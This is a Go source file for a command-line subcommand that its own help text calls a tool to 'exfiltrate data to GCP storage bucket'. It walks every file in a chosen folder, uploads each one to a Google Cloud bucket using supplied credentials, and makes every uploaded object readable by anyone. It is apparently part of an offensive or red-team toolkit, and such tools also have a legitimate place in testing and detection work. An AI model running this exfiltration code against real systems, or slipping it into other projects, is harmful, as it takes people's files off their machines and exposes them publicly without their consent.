package cmd

import (
	"fmt"
	"context"
	"log"
	"io"
	"os"
	"path/filepath"
	"google.golang.org/api/option"
	"cloud.google.com/go/storage"
	"github.com/spf13/cobra"
)

func upload(projectID, bucket, folder string, gcpkey string) error {

	var public bool = true
	ctx := context.Background()

	client, err := storage.NewClient(ctx, option.WithCredentialsFile(gcpkey))
//	client, err := storage.NewClient(ctx)
	if err != nil {
		return err
	}

	bh := client.Bucket(bucket)
	// Next check if the bucket exists
	if _, err = bh.Attrs(ctx); err != nil {
		return err
	}


	var files []string
	err = filepath.Walk(folder, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
		files = append(files, path)
        }
        return nil
    })
    if err != nil {
        panic(err)
    }

	// Upload files in folder
    for _, file := range files {
        fmt.Println("GCP Upload: ", file)

		source := file
		name := file

		var r io.Reader
    	if source == "" {
        	r = os.Stdin
        	log.Printf("Reading from stdin...")
    	} else {
        	f, err := os.Open(source)
        	if err != nil {
            	log.Fatal(err)
        	}
        	defer f.Close()
        	r = f
    	}

		obj := bh.Object(name)
		w := obj.NewWriter(ctx)
		if _, err := io.Copy(w, r); err != nil {
			return err
		}
		if err := w.Close(); err != nil {
			return err
		}

		if public {
			if err := obj.ACL().Set(ctx, storage.AllUsers, storage.RoleReader); err != nil {
				return err
			}
		}
    }
	return err
}


// gcpbucketCmd represents the gcpbucket command
var gcpbucketCmd = &cobra.Command{
	Use:   "gcpbucket",
	Short: "Exfiltrate data  to GCP storage bucket",
	Long: "Exfiltrate data to GCP storage bucket",
	Run: func(cmd *cobra.Command, args []string) {
		foldername, _:= cmd.Flags().GetString("folder")
   		if foldername == "" {
			cmd.Help()
			os.Exit(1)
   		}
		bucket, _:= cmd.Flags().GetString("bucket")
		projectID, _:= cmd.Flags().GetString("project")
		gcpkey, _:= cmd.Flags().GetString("keys")

		if (foldername == "" || bucket == "" || projectID == "" || gcpkey == "") {
			fmt.Println("Null Options.....")
            cmd.Help()
            os.Exit(1)
       	}

		err := upload(projectID, bucket, foldername, gcpkey)
		if err != nil {
			switch err {
			case storage.ErrBucketNotExist:
				log.Fatal("Please create the bucket first e.g. with `gsutil mb`")
			default:
				log.Fatal(err)
			}
		}
	},
}

func init() {
	rootCmd.AddCommand(gcpbucketCmd)
	gcpbucketCmd.Flags().StringP("project", "p", "", "GCP Project Id")
	gcpbucketCmd.Flags().StringP("bucket", "b", "", "GCP bucket name to upload content")
	gcpbucketCmd.Flags().StringP("keys", "k", "", "GCP Keys")
	gcpbucketCmd.Flags().StringP("folder", "f", "", "Files in folder to upload")
}
